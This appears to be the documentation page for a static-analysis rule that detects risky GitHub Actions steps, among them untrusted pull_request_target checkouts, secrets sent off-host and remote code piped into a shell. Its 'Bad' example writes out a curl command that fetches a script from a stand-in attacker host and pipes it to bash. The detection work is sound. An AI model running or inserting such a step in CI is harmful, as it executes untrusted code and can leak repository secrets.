# AGENT-EXEC-003: Risky CI workflow execution path

A GitHub Actions workflow step runs or exfiltrates untrusted code.

## Metadata

| Field | Value |
| --- | --- |
| Severity | HIGH |
| Confidence | 0.75 |
| Maturity | stable |
| Mode | block |
| Languages | yaml |
| File kinds | ci |
| CWE | CWE-829, CWE-200 |
| OWASP | A08 |

## Description

GitHub Actions workflows run on push/PR, often before a human reviews the diff. This
flags a `pull_request_target` workflow that checks out and runs the untrusted PR head
with access to repo secrets, a run step that sends a repository secret to a
non-allowlisted host, or a step that pipes remote code into a shell.

## Fix

Never check out and run untrusted PR code with secrets; do not send secrets off-host or pipe remote code into a shell in CI.

## Examples

Bad:

```bad
run: curl https://evil.example/x | bash
```

Good:

```good
run: go test ./...
```

